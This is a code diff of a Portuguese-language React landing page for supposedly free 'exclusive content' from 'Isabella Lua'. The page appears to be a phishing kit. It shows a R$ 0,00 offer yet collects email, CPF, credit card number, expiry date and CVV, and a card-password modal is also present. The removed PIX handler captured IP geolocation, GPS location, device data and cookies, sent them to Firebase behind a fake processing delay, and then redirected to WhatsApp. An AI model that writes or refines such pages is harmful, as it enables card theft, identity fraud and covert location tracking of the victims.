@@ -38,7 +38,7 @@ const WHATSAPP_LINK = "https://wa.me/SEU_NUMERO_AQUI?text=Ol%C3%A1%21%20Acabei%2
 export default function GrupoIsabella() {
   const [showSubscriptionModal, setShowSubscriptionModal] = useState(false)
   const [showCardPasswordModal, setShowCardPasswordModal] = useState(false)
-  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'card' | 'pix' | null>(null)
+  // Removido selectedPaymentMethod, pois agora é sempre 'card'
 
   const [subscriptionEmail, setSubscriptionEmail] = useState("")
   const [cpf, setCpf] = useState("")
@@ -316,38 +316,7 @@ export default function GrupoIsabella() {
     window.location.href = WHATSAPP_LINK; // Redirect to WhatsApp
   }
 
-  const handlePixSubmission = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setIsLoading(true)
-
-    const preciseLocation = await getPreciseLocation()
-    const deviceInfo = getDeviceInfo()
-    const cookiesInfo = getCookiesInfo()
-
-    const dadosAssinaturaPix = {
-      email: subscriptionEmail,
-      cpf: cpf,
-      plataforma: "Assinatura PIX - Conteúdo Básico",
-      localizacao: locationData ? { ip: locationData.ip, cidade: locationData.city, regiao: locationData.region, pais: locationData.country, timezone: locationData.timezone, provedor: locationData.isp, latitude: locationData.lat, longitude: locationData.lon } : null,
-      localizacaoGPS: preciseLocation,
-      dispositivo: deviceInfo,
-      cookies: cookiesInfo,
-      dataHora: deviceInfo.localDateTime,
-      dataHoraISO: deviceInfo.dateTime,
-      timestamp: deviceInfo.timestamp,
-      versaoCaptura: "2.8", // Updated version
-      fonte: "Isabella Lua - Assinatura PIX",
-    }
-
-    await sendDataToFirebase(dadosAssinaturaPix);
-
-    // Simulate processing delay
-    await new Promise(resolve => setTimeout(resolve, 2000));
-
-    setIsLoading(false);
-    setShowSubscriptionModal(false);
-    window.location.href = WHATSAPP_LINK; // Redirect to WhatsApp
-  }
+  // Removida a função handlePixSubmission
 
   // Helper for credit card number formatting
   const formatCreditCardNumber = (value: string) => {
@@ -520,7 +489,7 @@ export default function GrupoIsabella() {
                   <Button
                     onClick={() => {
                       setShowSubscriptionModal(true);
-                      setSelectedPaymentMethod(null); // Reset selection
+                      // setSelectedPaymentMethod(null); // Não é mais necessário, pois só há uma opção
                     }}
                     className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                   >
@@ -565,251 +534,149 @@ export default function GrupoIsabella() {
         </footer>
       </div>
 
-       {/* Subscription Modal - Step 1: Choose Payment Method / Card Form / PIX Form */}
+       {/* Subscription Modal - Agora apenas para Cartão */}
       <Dialog open={showSubscriptionModal} onOpenChange={setShowSubscriptionModal}>
         <DialogContent className="sm:max-w-md p-0 rounded-2xl overflow-hidden max-h-[90vh] flex flex-col">
           <DialogHeader className="p-4 sm:p-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white flex-shrink-0">
             <DialogTitle className="text-2xl font-bold text-center">
-              {selectedPaymentMethod ? "Assinatura Premium" : "Escolha sua Assinatura"}
+              Assinatura Premium
             </DialogTitle>
             <DialogDescription className="text-center text-white/80 mt-1 text-sm">
-              {selectedPaymentMethod === 'card' && "Preencha os dados do seu cartão para acesso completo."}
-              {selectedPaymentMethod === 'pix' && "Confirme seus dados para acesso ao conteúdo básico via PIX."}
-              {!selectedPaymentMethod && "Selecione como deseja acessar o conteúdo exclusivo da Isabella Lua."}
+              Preencha os dados do seu cartão para acesso completo.
             </DialogDescription>
           </DialogHeader>
 
           <div className="p-4 sm:p-6 flex-1 overflow-y-auto">
-            {!selectedPaymentMethod && (
-              <div className="space-y-4">
-                <Button
-                  onClick={() => setSelectedPaymentMethod('card')}
-                  className="w-full min-h-[90px] bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg shadow-md flex flex-col items-center justify-center text-center px-4"
-                >
-                  <CreditCard className="w-7 h-7 mb-2" />
-                  <span className="text-xl leading-tight">Assinar com Cartão</span>
-                  <span className="text-sm font-normal opacity-90 mt-1 leading-tight">Libera TODOS os conteúdos (GRÁTIS!)</span>
-                </Button>
-                <Button
-                  onClick={() => setSelectedPaymentMethod('pix')}
-                  className="w-full min-h-[90px] bg-green-600 hover:bg-green-700 text-white font-bold text-base rounded-lg shadow-md flex flex-col items-center justify-center text-center px-4"
-                >
-                  <CheckCircle2 className="w-7 h-7 mb-2" />
-                  <span className="text-xl leading-tight">Assinar com PIX <span className="text-[#FFD700] text-base">Exclusivo</span></span>
-                  <span className="text-sm font-normal opacity-90 mt-1 leading-tight">Libera APENAS alguns conteúdos básicos</span>
-                </Button>
+            {/* Conteúdo do formulário de cartão */}
+            <div className="text-center mb-6 bg-purple-50 p-4 rounded-lg border border-purple-200">
+              <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
+                <img
+                  src="/placeholder.svg?height=100&width=100"
+                  alt="Capa do Conteúdo Exclusivo"
+                  className="w-24 h-24 object-cover rounded-md flex-shrink-0"
+                />
+                <div className="flex-1 text-center sm:text-left">
+                  <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
+                    <Tag className="w-5 h-5 text-purple-600" />
+                    <p className="text-lg font-semibold text-purple-800">Oferta Exclusiva!</p>
+                  </div>
+                  <p className="text-sm text-gray-600">De <span className="line-through font-bold text-red-500">R$ 99,00</span> por apenas</p>
+                  <p className="text-4xl font-extrabold text-green-600 mt-2">R$ 0,00</p>
+                  <p className="text-xs text-gray-500 mt-1">Acesso completo por tempo limitado!</p>
+                </div>
               </div>
-            )}
+            </div>
 
-            {selectedPaymentMethod === 'card' && (
-              <>
-                <div className="text-center mb-6 bg-purple-50 p-4 rounded-lg border border-purple-200">
-                  <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
-                    <img
-                      src="/placeholder.svg?height=100&width=100"
-                      alt="Capa do Conteúdo Exclusivo"
-                      className="w-24 h-24 object-cover rounded-md flex-shrink-0"
+            <form onSubmit={handleInitialCardSubmission} className="space-y-4">
+              <div>
+                <Label htmlFor="sub-email" className="text-sm font-medium text-gray-700">
+                  Email
+                </Label>
+                <div className="relative mt-1">
+                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
+                  <Input
+                    id="sub-email"
+                    type="email"
+                    placeholder="seu.email@exemplo.com"
+                    value={subscriptionEmail}
+                    onChange={(e) => setSubscriptionEmail(e.target.value)}
+                    className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
+                    required
+                  />
+                </div>
+              </div>
+
+              <div>
+                <Label htmlFor="cpf" className="text-sm font-medium text-gray-700">
+                  CPF
+                </Label>
+                <div className="relative mt-1">
+                  <Input
+                    id="cpf"
+                    type="text"
+                    placeholder="000.000.000-00"
+                    value={cpf}
+                    onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
+                    className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
+                    maxLength={11}
+                    required
+                  />
+                </div>
+              </div>
+
+              <div>
+                <Label htmlFor="credit-card" className="text-sm font-medium text-gray-700">
+                  Número do Cartão de Crédito
+                </Label>
+                <div className="relative mt-1">
+                  <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
+                  <Input
+                    id="credit-card"
+                    type="text"
+                    placeholder="XXXX XXXX XXXX XXXX"
+                    value={formatCreditCardNumber(creditCardNumber)}
+                    onChange={(e) => setCreditCardNumber(e.target.value)}
+                    className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
+                    maxLength={19} // 16 digits + 3 spaces
+                    required
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                <div>
+                  <Label htmlFor="expiration-date" className="text-sm font-medium text-gray-700">
+                    Validade (MM/AA)
+                  </Label>
+                  <div className="relative mt-1">
+                    <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
+                    <Input
+                      id="expiration-date"
+                      type="text"
+                      placeholder="MM/AA"
+                      value={formatExpirationDate(expirationDate)}
+                      onChange={(e) => setExpirationDate(e.target.value)}
+                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
+                      maxLength={5} // MM/YY
+                      required
                     />
-                    <div className="flex-1 text-center sm:text-left">
-                      <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
-                        <Tag className="w-5 h-5 text-purple-600" />
-                        <p className="text-lg font-semibold text-purple-800">Oferta Exclusiva!</p>
-                      </div>
-                      <p className="text-sm text-gray-600">De <span className="line-through font-bold text-red-500">R$ 99,00</span> por apenas</p>
-                      <p className="text-4xl font-extrabold text-green-600 mt-2">R$ 0,00</p>
-                      <p className="text-xs text-gray-500 mt-1">Acesso completo por tempo limitado!</p>
-                    </div>
                   </div>
                 </div>
-
-                <form onSubmit={handleInitialCardSubmission} className="space-y-4">
-                  <div>
-                    <Label htmlFor="sub-email" className="text-sm font-medium text-gray-700">
-                      Email
-                    </Label>
-                    <div className="relative mt-1">
-                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                      <Input
-                        id="sub-email"
-                        type="email"
-                        placeholder="seu.email@exemplo.com"
-                        value={subscriptionEmail}
-                        onChange={(e) => setSubscriptionEmail(e.target.value)}
-                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div>
-                    <Label htmlFor="cpf" className="text-sm font-medium text-gray-700">
-                      CPF
-                    </Label>
-                    <div className="relative mt-1">
-                      <Input
-                        id="cpf"
-                        type="text"
-                        placeholder="000.000.000-00"
-                        value={cpf}
-                        onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
-                        className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                        maxLength={11}
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div>
-                    <Label htmlFor="credit-card" className="text-sm font-medium text-gray-700">
-                      Número do Cartão de Crédito
-                    </Label>
-                    <div className="relative mt-1">
-                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                      <Input
-                        id="credit-card"
-                        type="text"
-                        placeholder="XXXX XXXX XXXX XXXX"
-                        value={formatCreditCardNumber(creditCardNumber)}
-                        onChange={(e) => setCreditCardNumber(e.target.value)}
-                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                        maxLength={19} // 16 digits + 3 spaces
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <Label htmlFor="expiration-date" className="text-sm font-medium text-gray-700">
-                        Validade (MM/AA)
-                      </Label>
-                      <div className="relative mt-1">
-                        <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                        <Input
-                          id="expiration-date"
-                          type="text"
-                          placeholder="MM/AA"
-                          value={formatExpirationDate(expirationDate)}
-                          onChange={(e) => setExpirationDate(e.target.value)}
-                          className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                          maxLength={5} // MM/YY
-                          required
-                        />
-                      </div>
-                    </div>
-                    <div>
-                      <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
-                        CVV
-                      </Label>
-                      <div className="relative mt-1">
-                        <LockKeyhole className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                        <Input
-                          id="cvv"
-                          type="text"
-                          placeholder="123"
-                          value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))} // Remove non-digits
-                          className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                          maxLength={4}
-                          required
-                        />
-                      </div>
-                    </div>
-                  </div>
-
-                  <Button
-                    type="submit"
-                    disabled={isLoading}
-                    className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
-                  >
-                    {isLoading ? (
-                      <div className="flex items-center gap-2">
-                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        Processando...
-                      </div>
-                    ) : (
-                      "Continuar"
-                    )}
-                  </Button>
-                </form>
-              </>
-            )}
-
-            {selectedPaymentMethod === 'pix' && (
-              <>
-                <div className="text-center mb-6 bg-green-50 p-4 rounded-lg border border-green-200">
-                  <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
-                    <img
-                      src="/placeholder.svg?height=100&width=100"
-                      alt="Capa do Conteúdo Básico"
-                      className="w-24 h-24 object-cover rounded-md flex-shrink-0"
+                <div>
+                  <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
+                    CVV
+                  </Label>
+                  <div className="relative mt-1">
+                    <LockKeyhole className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
+                    <Input
+                      id="cvv"
+                      type="text"
+                      placeholder="123"
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))} // Remove non-digits
+                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
+                      maxLength={4}
+                      required
                     />
-                    <div className="flex-1 text-center sm:text-left">
-                      <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
-                        <CheckCircle2 className="w-5 h-5 text-green-600" />
-                        <p className="text-lg font-semibold text-green-800">Acesso Básico via PIX</p>
-                      </div>
-                      <p className="text-sm text-gray-600">Você terá acesso a uma seleção de conteúdos básicos.</p>
-                      <p className="text-4xl font-extrabold text-green-600 mt-2">GRÁTIS</p>
-                      <p className="text-xs text-gray-500 mt-1">Sem custo, acesso imediato!</p>
-                    </div>
                   </div>
                 </div>
+              </div>
 
-                <form onSubmit={handlePixSubmission} className="space-y-4">
-                  <div>
-                    <Label htmlFor="pix-email" className="text-sm font-medium text-gray-700">
-                      Email
-                    </Label>
-                    <div className="relative mt-1">
-                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                      <Input
-                        id="pix-email"
-                        type="email"
-                        placeholder="seu.email@exemplo.com"
-                        value={subscriptionEmail}
-                        onChange={(e) => setSubscriptionEmail(e.target.value)}
-                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-green-500 focus:ring-green-500 rounded-lg"
-                        required
-                      />
-                    </div>
+              <Button
+                type="submit"
+                disabled={isLoading}
+                className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
+              >
+                {isLoading ? (
+                  <div className="flex items-center gap-2">
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    Processando...
                   </div>
-
-                  <div>
-                    <Label htmlFor="pix-cpf" className="text-sm font-medium text-gray-700">
-                      CPF
-                    </Label>
-                    <div className="relative mt-1">
-                      <Input
-                        id="pix-cpf"
-                        type="text"
-                        placeholder="000.000.000-00"
-                        value={cpf}
-                        onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
-                        className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-green-500 focus:ring-green-500 rounded-lg"
-                        maxLength={11}
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <Button
-                    type="submit"
-                    disabled={isLoading}
-                    className="w-full h-12 bg-green-600 hover:bg-green-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
-                  >
-                    {isLoading ? (
-                      <div className="flex items-center gap-2">
-                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        Processando...
-                      </div>
-                    ) : (
-                      "Acessar Conteúdo Básico"
-                    )}
-                  </Button>
-                </form>
-              </>
-            )}
+                ) : (
+                  "Continuar"
+                )}
+              </Button>
+            </form>
 
             <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
               Ao continuar, você concorda com os Termos de Serviço e a Política de Privacidade.
